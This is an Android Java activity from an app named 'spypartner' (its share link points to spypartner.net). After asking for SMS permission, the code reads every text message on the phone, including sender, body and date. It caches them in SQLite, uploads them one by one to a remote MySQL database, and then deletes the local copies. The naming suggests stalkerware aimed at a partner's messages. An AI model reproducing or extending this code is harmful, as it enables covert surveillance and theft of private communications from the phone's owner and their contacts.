package com.spypartner.jmtechnologies;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.design.widget.TabLayout;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.ViewPager;
import android.text.SpannableStringBuilder;
import android.text.Spanned;
import android.text.TextUtils;
import android.text.style.ForegroundColorSpan;
import android.view.View;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener,
        FragmentOne.OnFragmentInteractionListener ,
        FragmentTwo.OnFragmentInteractionListener ,
        FragmentThree.OnFragmentInteractionListener {

    ListView listView;
    EditText enterName,enterUsername,enterEmail;
    TextView textView,displayUsername;


    String name,username,email,userName,msgUsername,password;

    //class SendMessagesToDatabase
    String id,number,usernameMessage,body,date;
    String type = "send";

    Boolean CheckEditText;
    static Handler handler;

    private static final int PERMISSION_REQUEST_READ_SMS = 100;

    InsertMessagesDataBaseHelper insertMessagesDataBaseHelper;
    SendMessagesToDataBase sendMessagesToDataBase;
    DataBaseHelper dataBaseHelper;
    SessionManager sessionManager;
    SQLiteHandler sqLiteHandler;


    @SuppressLint("HandlerLeak")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        /**
         * start of tab layout activities
         */
        TabLayout tabLayout = findViewById(R.id.tab_layout);
        tabLayout.addTab(tabLayout.newTab().setText("Home"));
        tabLayout.addTab(tabLayout.newTab().setText("Messages"));
        tabLayout.addTab(tabLayout.newTab().setText("About"));
        tabLayout.setTabGravity(TabLayout.GRAVITY_FILL);

        final ViewPager viewPager = findViewById(R.id.pager);
        final PagerAdapter adapter = new PagerAdapter
                (getSupportFragmentManager(), tabLayout.getTabCount());
        viewPager.setAdapter(adapter);
        viewPager.addOnPageChangeListener(new TabLayout.TabLayoutOnPageChangeListener(tabLayout));
        tabLayout.setOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {
                viewPager.setCurrentItem(tab.getPosition());
            }

            @Override
            public void onTabUnselected(TabLayout.Tab tab) {

            }

            @Override
            public void onTabReselected(TabLayout.Tab tab) {

            }
        });
        /**
         * end of tab layout activities
         */


        /**
         * Start of navigation drawer activities
         */

        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Hello "+userName, Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });

        DrawerLayout drawer = findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.addDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);
        /**
         * end of navigation drawer activities
         */

        /**
         * Start of messages activity section
         */
        //creating an instance of the InsertMessagesDataBaseHelper class
        insertMessagesDataBaseHelper = new InsertMessagesDataBaseHelper(this);
        sqLiteHandler = new SQLiteHandler(this);
        dataBaseHelper = new DataBaseHelper(this);
        sessionManager = new SessionManager(getApplicationContext());

        enterUsername = findViewById(R.id.username);
        enterEmail = findViewById(R.id.email);

        displayUsername = findViewById(R.id.textViewUsername);

        if (!sessionManager.isLoggedIn()){
            logoutUser();
            sqLiteHandler.deleteUser();
        }

        //getting user details from the sql database
        Cursor cursor = sqLiteHandler.getAllUserDetails();
        if (cursor.getCount() > 0){
            while (cursor.moveToNext()){
                id = cursor.getString(0);
                userName = cursor.getString(1);
                password = cursor.getString(2);
            }
            cursor.close();
        }
        //display the username on the dashboard
        displayUsername.setText(userName);

        listView = findViewById(R.id.listview);

        //starting the service
        int permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if (permissionCheck == PackageManager.PERMISSION_GRANTED){

            //permission granted
            //the first thread for reading messages from inbox
            //and saving them to sql database
            Thread thread1 = new Thread(){
                Message message = new Message();
                @Override
                public void run() {
                    super.run();
                    //retrieve messages from inbox
                    //and save them to sql database
                    readMessagesFromInboxAndSaveIntoSqlDatabase();
                    message.arg1 = 1;
                    handler.sendMessage(message);
                }
            };
            thread1.start();//start thread

        }else{
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_SMS},
                    PERMISSION_REQUEST_READ_SMS);

        }

        //second thread for sending messages to the online database
        final Thread thread2 = new Thread(){
            Message message = new Message();

            @Override
            public void run(){
                super.run();
                //check whether there is internet connectivity
                if(CheckNetworkStatus.isNetworkAvailable(getApplicationContext())) {
                    //read messages from sql database
                    //and send them to mysql database
                    readMessagesFromSqlAndSendToMysqlDatabase();
                    message.arg1 = 2;
                    handler.sendMessage(message);
                }else{
                    //if no internet connectivity
                    //send error message to user
                    message.arg1 = 4;
                    handler.sendMessage(message);
                }
            }
        };

        //handler for receiving messages from the thread
        handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                //if thread1 is executed successfully
                //display message and start the second thread
                if (msg.arg1 == 1){
                    //display the messages into the listview
                    // listView.setAdapter(arrayAdapter);

                    System.out.println("-------------completed reading messages-------------");
                    System.out.println("---------------------------------completed saving messages to sql lite--------------------------------");
                    //if thread one finishes executing
                    //start the second thread
                    thread2.start();

                    //if thread2 is executed successfully
                    //display message and start the third thread
                }else if(msg.arg1 == 2){
                    Toast.makeText(getApplicationContext(),
                            "Started sending messages to MySql database", Toast.LENGTH_LONG).show();
                    System.out.println("---------------------------------------Started sending messages to MySql  database--------------------------------");

                }else if(msg.arg1 == 4){
                    Toast.makeText(getApplicationContext(), "No internet connectivity", Toast.LENGTH_SHORT).show();
                    System.out.println("------------------------no internet connectivity----------------------------------------");
                }
            }
        };

    }

    /**
     * start of navigation drawer methods and functions
     */

    @Override
    public void onBackPressed() {
        DrawerLayout drawer = findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
      /*  if (id == R.id.action_settings) {
            return true;
        }*/

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();
        switch (id)
        {
            case R.id.nav_home:
                break;
            case R.id.nav_manage:
                break;
            case R.id.nav_share:
                Intent sharingIntent = new Intent(android.content.Intent.ACTION_SEND);
                sharingIntent.setType("text/plain");
                String shareBodyText = "https://spypartner.net";
                sharingIntent.putExtra(android.content.Intent.EXTRA_SUBJECT,"Please share our app");
                sharingIntent.putExtra(android.content.Intent.EXTRA_TEXT, shareBodyText);
                startActivity(Intent.createChooser(sharingIntent, "Share With:"));
                return true;
            case R.id.nav_send:
                break;
            case R.id.nav_developer:

                break;
            case R.id.nav_version:
                break;
            case R.id.nav_logout:
                logoutUser();
                break;
        }

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }

    /**
     * logging user out method
     */
    //destroy the user session
    //logout the user
    private void logoutUser() {
        final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this,R.style.progressDialogColor);
        String titleText = "Confirm Exit!";
        ForegroundColorSpan foregroundColorSpan = new ForegroundColorSpan(Color.RED);
        SpannableStringBuilder ssBuilder = new SpannableStringBuilder(titleText);
        ssBuilder.setSpan(foregroundColorSpan,0,titleText.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);

        alertDialog.setTitle(ssBuilder);
        alertDialog.setIcon(R.drawable.ic_warnin);
        alertDialog.setMessage("Are you sure you want to exit?");
        alertDialog.setCancelable(false);

        alertDialog.setPositiveButton("Yes", new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface arg0, int arg1) {
                //if clicked
                //close the dialog box,
                //log out the user
                sqLiteHandler.deleteUser();//delete the user details from sql database
                sessionManager.setLogin(false);
                Intent intent = new Intent(getApplicationContext(),LoginUser.class);
                startActivity(intent);
                finish();
            }
        });

        alertDialog.setNegativeButton("No", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                //if clicked
                //close the dialog box and do nothing
                dialog.cancel();
            }
        });
        //create the alert box and display it to the user
        alertDialog.create().show();

    }

    /**
     * background activities
     */
    //when permission is granted during runtime
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults){
        if (requestCode == PERMISSION_REQUEST_READ_SMS){
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED){
                //permission is granted
                Thread thread1 = new Thread(){
                    Message message = new Message();
                    @Override
                    public void run() {
                        super.run();
                        //retrieve messages from inbox
                        //and save them into sql database
                        readMessagesFromInboxAndSaveIntoSqlDatabase();
                        message.arg1 = 1;
                        handler.sendMessage(message);
                    }
                };
                thread1.start();//start thread

            }else {
                Toast.makeText(this, "Grant Permission", Toast.LENGTH_SHORT).show();
            }
        }
    }
    //read all messages from the device's sms inbox
    private void readMessagesFromInbox() {
        Uri inboxUri = Uri.parse("content://sms/");
        // smsList = new ArrayList<>();
        String Number,Body,dateLong,Date,Id;

        ContentResolver contentResolver = getContentResolver();

        Cursor cursor = contentResolver.query(inboxUri,null,null,null,null);
        while(cursor.moveToNext()){
            Id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
            Number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            Body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
            //converting the date from millis
            dateLong = cursor.getString(cursor.getColumnIndexOrThrow("date"));
            Long timestamp = Long.parseLong(dateLong);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            @SuppressLint("SimpleDateFormat") DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
            Date = dateFormat.format(calendar.getTime());

            //smsList.add("Id: "+Id+"\n" + "Number: "+Number+"\n"+"Body: "+Body+"\n"+"Date: "+Date);
        }
        cursor.close();
        //declare array adapter to display messages into the listview
        // arrayAdapter = new ArrayAdapter<>(this,android.R.layout.simple_list_item_1,smsList);
    }

    //after reading the messages
    //save the messages into the sql lite database for later processing
    private void readMessagesFromInboxAndSaveIntoSqlDatabase() {
        //method for reading messages from inbox
        Uri inboxUri = Uri.parse("content://sms/");
        String Number,Body,dateLong,Date;

        ContentResolver contentResolver = getContentResolver();

        Cursor cursor = contentResolver.query(inboxUri,null,null,null,null);
        //assert cursor != null;
        //if data does not exist in the database
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                //getting phone number,message body and date from the inbox
                Number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                Body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                msgUsername = userName;
                //converting the date from millis
                dateLong = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                Long timestamp = Long.parseLong(dateLong);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                @SuppressLint("SimpleDateFormat") DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
                Date = dateFormat.format(calendar.getTime());

                //System.out.println(Number+"\n"+Body+"\n"+Date);
                //insert messages in the database
                insertMessagesDataBaseHelper.insertAllMessages(Number, msgUsername, Body, Date);
            }
            cursor.close();

        }else {
            System.out.println("---------------------messages already exists-------------------------------");
        }
    }
    //read messages from database
    //and send them to MySql database
    private void readMessagesFromSqlAndSendToMysqlDatabase(){
        //String msgUsername = null;
        SQLiteHandler sqLiteHandler = new SQLiteHandler(getApplicationContext());
        Cursor cursor1 = sqLiteHandler.getAllUserDetails();
        if (cursor1 != null && cursor1.getCount() > 0){
            while (cursor1.moveToNext()){
                msgUsername = cursor1.getString(1);
            }
            cursor1.close();
        }

        //InsertMessagesDataBaseHelper insertMsgDbHelper = new InsertMessagesDataBaseHelper(getApplicationContext());
        Cursor cursor = insertMessagesDataBaseHelper.getAllMessages();

        //get the messages from sql lite database
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                id = cursor.getString(0);
                number = cursor.getString(1);
                usernameMessage = cursor.getString(2);
                body = cursor.getString(3);
                date = cursor.getString(4);

                //System.out.println(number+"\n"+usernameMessage+"\n"+body+"\n"+date);

                //send the messages to Mysql online database
                sendMessagesToDataBase = new SendMessagesToDataBase(getApplicationContext());
                sendMessagesToDataBase.execute(type, id, usernameMessage, number, body, date);

                if (!CheckNetworkStatus.isNetworkAvailable(getApplicationContext())) {
                    sendMessagesToDataBase.cancel(true);
                    break;
                }
            }

            cursor.close();
            //deleting all messages after sending them to Mysql database
            insertMessagesDataBaseHelper.deleteAllMessages();
        } else {
            System.out.println("----------------------no data found in sql db--------------------------");
        }
    }
    //deleting all messages in the database
    private void deleteAllMessagesFromDataBase() {
        //deleting all the messages from the database
        insertMessagesDataBaseHelper.deleteAllMessages();

        Toast.makeText(this,
                "Messages Deleted Successfully", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onFragmentInteraction(Uri uri) {

    }
    /**
     * end of background activities
     */

}
